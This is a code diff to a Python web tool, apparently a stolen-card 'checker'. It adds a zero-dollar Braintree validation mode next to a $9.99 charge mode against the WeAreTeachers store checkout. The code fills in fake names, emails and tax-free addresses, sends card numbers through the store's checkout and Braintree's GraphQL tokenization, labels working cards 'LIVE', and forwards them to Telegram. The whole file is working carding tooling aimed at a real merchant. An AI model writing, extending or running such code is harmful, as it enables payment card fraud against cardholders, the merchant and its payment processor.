@@ -25,16 +25,23 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.weareteachers.checker")
 
-app = FastAPI(title="WeAreTeachers Braintree Checker", version="10.0.0")
+app = FastAPI(title="WeAreTeachers Multi-Mode Checker", version="12.0.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "weareteachers_bt": {
-        "name": "WeAreTeachers (Braintree WooCommerce Gateway)",
+        "name": "WeAreTeachers ($9.99 USD Charge Engine)",
         "base_url": "https://www.weareteachers.com",
         "preload_url": "https://www.weareteachers.com/?add-to-cart=1909302",
         "auth_url": "https://www.weareteachers.com/?wc-ajax=checkout",
-        "engine": "weareteachers_braintree",
+        "engine": "charge",
     },
+    "weareteachers_auth": {
+        "name": "WeAreTeachers (True Auth / Zero-Dollar Validation)",
+        "base_url": "https://www.weareteachers.com",
+        "preload_url": "https://www.weareteachers.com/?add-to-cart=1909302",
+        "auth_url": "https://www.weareteachers.com/?wc-ajax=checkout",
+        "engine": "auth",
+    }
 }
 
 fake = Faker("en_US")
@@ -305,7 +312,8 @@ def detect_wc_card_type(cc: str, brand_code: str = "") -> str:
     return "visa"
 
 
-async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
+# --- ENGINE 1: $9.99 CHARGE CHECKER ---
+async def execute_charge_engine(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
     host = "https://www.weareteachers.com"
     product_url = f"{host}/?add-to-cart=1909302"
     checkout_url = f"{host}/checkout/"
@@ -450,7 +458,7 @@ async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy
 
     if rr.status_code in (200, 201) and (order_status in ("processing", "completed", "on-hold") or payment_status == "success"):
         oid = jj.get("order_id") or "?"
-        return "LIVE", f"Charged Successfully! Order ID: {oid} | [{bank_tag}]", rr.status_code
+        return "LIVE", f"CHARGED SUCCESSFULLY! Order ID: {oid} | [{bank_tag}]", rr.status_code
 
     msgs = jj.get("message") or ""
     if not msgs and isinstance(payment_result.get("payment_details"), list):
@@ -468,11 +476,114 @@ async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy
     return "DECLINED", f"{clean_reason} | [{bank_tag}]", rr.status_code
 
 
+# --- ENGINE 2: TRUE AUTH (ZERO-DOLLAR VALIDATION) ---
+async def execute_auth_engine(session: AsyncSession, cc: str, mm: str, yy: str, cvv: str) -> tuple[str, str, int]:
+    host = "https://www.weareteachers.com"
+    product_url = f"{host}/?add-to-cart=1909302"
+    checkout_url = f"{host}/checkout/"
+    bt_graphql = "https://payments.braintree-api.com/graphql"
+    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
+
+    ident = {
+        "first_name": fake.first_name(),
+        "last_name": fake.last_name(),
+        "company": "",
+        "country": "US",
+        **random.choice(US_TAX_FREE_ADDRESSES),
+        "email": f"{fake.first_name().lower()}.{fake.last_name().lower()}{random.randint(10, 99999)}@gmail.com"
+    }
+    session_id = str(uuid.uuid4())
+
+    prod_res = await session.get(product_url, headers={"accept": "text/html", "user-agent": ua, "referer": host + "/"}, timeout=10)
+    if prod_res.status_code >= 400:
+        return "DECLINED", f"Product load failed HTTP {prod_res.status_code}", prod_res.status_code
+
+    co = await session.get(checkout_url, headers={"accept": "text/html", "user-agent": ua, "referer": product_url}, timeout=12)
+    if co.status_code >= 400 or "/checkout" not in co.url:
+        return "DECLINED", f"Checkout load failed HTTP {co.status_code}", co.status_code
+
+    html = co.text
+    tokens = extract_checkout_tokens(html)
+    client_token_nonce = tokens["client_token_nonce"]
+
+    if not client_token_nonce:
+        return "DECLINED", "Checkout parameters missing (client_token_nonce)", 200
+
+    fingerprint = await fetch_braintree_fingerprint(session, client_token_nonce)
+    if not fingerprint:
+        return "DECLINED", "Failed to retrieve Braintree fingerprint", 200
+
+    tokenize_query = (
+        "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { "
+        "  tokenizeCreditCard(input: $input) { "
+        "    token "
+        "    creditCard { "
+        "      bin brandCode last4 cardholderName expirationMonth expirationYear "
+        "      binData { issuingBank } "
+        "    } "
+        "  } "
+        "}"
+    )
+    tp = {
+        "clientSdkMetadata": {"source": "client", "integration": "custom", "sessionId": session_id},
+        "query": tokenize_query,
+        "variables": {
+            "input": {
+                "creditCard": {
+                    "number": cc, "expirationMonth": mm, "expirationYear": yy, "cvv": cvv,
+                    "cardholderName": f"{ident['first_name']} {ident['last_name']}",
+                    "billingAddress": {
+                        "countryCodeAlpha2": ident["country"], "extendedAddress": ident["address_2"],
+                        "locality": ident["city"], "region": ident["state"], "firstName": ident["first_name"],
+                        "lastName": ident["last_name"], "postalCode": ident["postcode"], "streetAddress": ident["address_1"]
+                    }
+                },
+                "options": {"validate": True}  # <--- Zero-Dollar Auth Verification Flag
+            }
+        },
+        "operationName": "TokenizeCreditCard"
+    }
+
+    bt_resp = await session.post(
+        bt_graphql,
+        json=tp,
+        headers={
+            "accept": "*/*", "authorization": "Bearer " + fingerprint, "braintree-version": "2018-05-10",
+            "content-type": "application/json", "origin": "https://assets.braintreegateway.com",
+            "referer": "https://assets.braintreegateway.com/", "user-agent": ua
+        },
+        timeout=10
+    )
+    try:
+        bj = bt_resp.json()
+    except Exception:
+        return "DECLINED", f"Tokenize non-json HTTP {bt_resp.status_code}", bt_resp.status_code
+
+    errors = bj.get("errors")
+    if errors:
+        err_msg = errors[0].get("message") or "Authorization Failed"
+        clean_err = htmllib.unescape(str(err_msg))
+        return "DECLINED", f"Auth Declined: {clean_err[:80]}", 200
+
+    tokenize_obj = (bj.get("data") or {}).get("tokenizeCreditCard") or {}
+    nonce_token = tokenize_obj.get("token")
+    if not nonce_token:
+        return "DECLINED", "Auth Error: No authorization token returned", 200
+
+    cc_meta = tokenize_obj.get("creditCard") or {}
+    bin_data = cc_meta.get("binData") or {}
+    brand_code = cc_meta.get("brandCode") or ""
+    bank_tag = (bin_data.get("issuingBank") or brand_code or "").strip()
+
+    return "LIVE", f"APPROVED (TRUE AUTH) | [{bank_tag}]", 200
+
+
 async def run_auth_check(card_line: str, proxy_url: str | None = None, target_key: str = "weareteachers_bt") -> AuthVerdict:
     started = time.perf_counter()
     proxies_dict = parse_proxy_string(proxy_url)
 
-    gate = RAW_DORK_GATES["weareteachers_bt"]
+    gate = RAW_DORK_GATES.get(target_key, RAW_DORK_GATES["weareteachers_bt"])
+    engine_type = gate.get("engine", "charge")
 
     parsed = universal_card_formatter(card_line)
     if not parsed:
@@ -519,7 +630,10 @@ async def run_auth_check(card_line: str, proxy_url: str | None = None, target_ke
                 verify=False,
                 timeout=20,
             ) as session:
-                status, reason, code = await execute_weareteachers_auth(session, cc, mm, yy, cvv)
+                if engine_type == "auth":
+                    status, reason, code = await execute_auth_engine(session, cc, mm, yy, cvv)
+                else:
+                    status, reason, code = await execute_charge_engine(session, cc, mm, yy, cvv)
 
                 bin_info = await bin_task
                 elapsed = (time.perf_counter() - started) * 1000
@@ -605,7 +719,7 @@ async def index() -> str:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>WeAreTeachers Braintree Checker</title>
+    <title>WeAreTeachers Multi-Mode Checker</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
         @keyframes pulseGlow {
@@ -636,9 +750,9 @@ async def index() -> str:
             <div>
                 <h1 class="text-2xl font-bold text-emerald-400 flex items-center gap-2">
                     <span class="inline-block w-3 h-3 bg-emerald-500 rounded-full animate-ping"></span>
-                    WeAreTeachers Braintree Checker
+                    WeAreTeachers Multi-Mode Checker
                 </h1>
-                <p class="text-xs text-zinc-400 font-mono">WooCommerce Store API + Braintree GraphQL Engine</p>
+                <p class="text-xs text-zinc-400 font-mono">Select between $9.99 Charge or True Auth (Zero-Dollar Validation)</p>
             </div>
             <div class="flex gap-2">
                 <button onclick="autoFormatCards()" class="text-xs bg-emerald-950 hover:bg-emerald-900 text-emerald-200 border border-emerald-700/50 px-3 py-1.5 rounded-lg transition font-semibold">
@@ -653,9 +767,10 @@ async def index() -> str:
         <div class="bg-zinc-900/90 backdrop-blur-md rounded-xl p-5 space-y-4 shadow-xl border border-zinc-800/80">
             <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                 <div class="md:col-span-2">
-                    <label class="block text-xs font-medium text-zinc-400 mb-1">Gateway Engine</label>
+                    <label class="block text-xs font-medium text-zinc-400 mb-1">Gateway Engine Mode</label>
                     <select id="targetSelect" class="w-full bg-zinc-950 border border-zinc-700 rounded-lg p-2.5 text-xs font-mono text-emerald-300 focus:outline-none focus:ring-1 focus:ring-emerald-500">
-                        <option value="weareteachers_bt">⚡ WEARETEACHERS BRAINTREE GATEWAY ($9.99)</option>
+                        <option value="weareteachers_bt">💳 $9.99 USD Checkout (Sale/Charge Engine)</option>
+                        <option value="weareteachers_auth">🛡️ True Auth Only (Zero-Dollar Validation / No Charge)</option>
                     </select>
                 </div>
                 <div class="flex items-end gap-3">
@@ -715,7 +830,7 @@ async def index() -> str:
 
             <div class="grid grid-cols-3 gap-3 text-center text-xs font-mono">
                 <div class="bg-zinc-950 border border-emerald-800/60 rounded-lg p-2.5 shadow-inner">
-                    <span class="text-zinc-400 block">LIVE / CHARGED</span>
+                    <span class="text-zinc-400 block">LIVE / APPROVED</span>
                     <span id="liveCount" class="text-lg font-bold text-emerald-400">0</span>
                 </div>
                 <div class="bg-zinc-950 border border-rose-800/60 rounded-lg p-2.5 shadow-inner">
@@ -747,7 +862,7 @@ async def index() -> str:
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
                     <h2 class="text-xs font-bold text-emerald-400 uppercase tracking-wider mb-2 flex items-center justify-between">
-                        <span>Live / Charged</span>
+                        <span>Live / Approved</span>
                         <span class="text-[10px] text-zinc-500 font-normal">Auto-scroll Active</span>
                     </h2>
                     <div id="liveBox" class="bg-zinc-950 rounded-lg p-3 text-xs font-mono text-emerald-300 border border-emerald-900/50 min-h-[160px] max-h-80 overflow-y-auto space-y-1.5 custom-scrollbar live-box-glow"></div>
@@ -832,7 +947,7 @@ async def index() -> str:
         const url = URL.createObjectURL(blob);
         const a = document.createElement("a");
         a.href = url;
-        a.download = "live_weareteachers_cards.txt";
+        a.download = "live_checked_cards.txt";
         a.click();
     }
 
@@ -966,7 +1081,7 @@ async def index() -> str:
                         liveBox.scrollTop = liveBox.scrollHeight;
                         playTone('live');
                         if (tgToken && tgChatId) {
-                            sendTelegram(tgToken, tgChatId, `🔥 APPROVED (LIVE) 🔥\\n${line}`);
+                            sendTelegram(tgToken, tgChatId, `🔥 APPROVED / LIVE 🔥\\n${line}`);
                         }
                     } else {
                         dead++;
